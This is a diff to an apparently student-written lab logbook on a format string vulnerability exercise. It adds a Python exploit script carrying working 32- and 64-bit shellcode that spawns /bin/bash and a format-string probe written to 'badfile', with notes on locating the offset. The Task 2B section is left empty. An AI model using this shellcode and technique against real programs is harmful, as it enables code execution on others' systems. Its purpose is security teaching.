@@ -110,4 +110,82 @@ with open('badfile', 'wb') as f:
 
 ## **Task 2**
 
-placeholder text
+## **Task 2A**
+
+* We edited the exploit script to add a string "AAAA" then add an 100 "%x" to the bytearray and see what it will be output.
+
+```python
+#!/usr/bin/python3
+import sys
+
+# 32-bit Generic Shellcode 
+shellcode_32 = (
+   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
+   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
+   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
+   "/bin/bash*"
+   "-c*"
+   # The * in this line serves as the position marker         *
+   "/bin/ls -l; echo '===== Success! ======'                  *"
+   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
+   "BBBB"   # Placeholder for argv[1] --> "-c"
+   "CCCC"   # Placeholder for argv[2] --> the command string
+   "DDDD"   # Placeholder for argv[3] --> NULL
+).encode('latin-1')
+
+
+# 64-bit Generic Shellcode 
+shellcode_64 = (
+   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
+   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
+   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
+   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
+   "/bin/bash*"
+   "-c*"
+   # The * in this line serves as the position marker         *
+   "/bin/ls -l; echo '===== Success! ======'                  *"
+   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
+   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
+   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
+   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
+).encode('latin-1')
+
+N = 1500
+# Fill the content with NOP's
+
+content = bytearray(0x90 for i in range(N))
+
+#add a string "AAAA"
+s = "AAAA/"
+fmt  = (s).encode('latin-1')
+content[0:len(fmt)] = fmt
+
+#fill the rest with 100 %x
+s = "%x/"*(100)
+fmt2  = (s).encode('latin-1')
+content[len(fmt):len(fmt)+len(fmt2)] = fmt2
+
+# Save the format string to file
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+## **Running**
+
+![Task2Arunning](images/logbook6/running2A.png)
+
+* We will run the script the same way we did in the previous task.
+
+## **Result**
+
+![Task2ADone](images/logbook6/task2A.png)
+
+* 41414141 is the ASCII value of the string "AAAA", we can find it in the 64th %x meaning that 64 is the number of format specifiers we need.
+
+## **Task 2B**
+
+## **Running**
+
+* We will run the script the same way we did in the previous task.
+
+## **Result**
